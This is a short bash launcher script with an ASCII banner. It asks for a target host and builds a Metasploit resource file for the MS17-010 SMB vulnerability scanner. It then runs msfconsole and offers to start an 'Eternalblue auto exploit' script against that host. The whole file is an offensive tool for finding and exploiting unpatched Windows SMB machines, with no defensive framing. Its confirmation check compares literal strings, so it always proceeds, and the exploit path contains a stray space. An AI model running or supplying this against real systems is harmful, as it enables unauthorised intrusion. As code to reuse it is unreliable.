#!/bin/bash
echo " ▄▄        ▄▄  ▄▄▄▄▄▄▄▄                                ▄▄        ▄▄       
      ██        ██   ▀▀▀▀▀███                        ██       █▄        █▄      
     ██        ██        ██▀    ▄████▄    ██▄████  ███████     █▄        █▄     
    ██        ██       ▄██▀    ██▄▄▄▄██   ██▀        ██         █▄        █▄    
   ▄█▀       ▄█▀      ▄██      ██▀▀▀▀▀▀   ██         ██          █▄        █▄   
  ▄█▀       ▄█▀      ███▄▄▄▄▄  ▀██▄▄▄▄█   ██         ██▄▄▄        █▄        █▄  
 ▄█▀       ▄█▀       ▀▀▀▀▀▀▀▀    ▀▀▀▀▀    ▀▀          ▀▀▀▀         █▄        █▄ "

read -p 'RHOST= ' rhost
mkdir scan
cd scan
echo use auxiliary/scanner/smb/smb_ms17_010 > scan.rc
echo "set rhosts" $rhost >> scan.rc
echo "set CHECK_PIPE true" >> scan.rc
echo "run" >> scan.rc
xterm -e "msfconsole -r scan.rc"
sleep 2
read -p 'Launch auto eternalblue?(Y/n)' answer
if [[ ( answer=="Y" ) || ( answer=="y" ) ]]; then
cd ..
./Eternalblue auto exploit.sh
else
echo "Goodbye :)"
fi
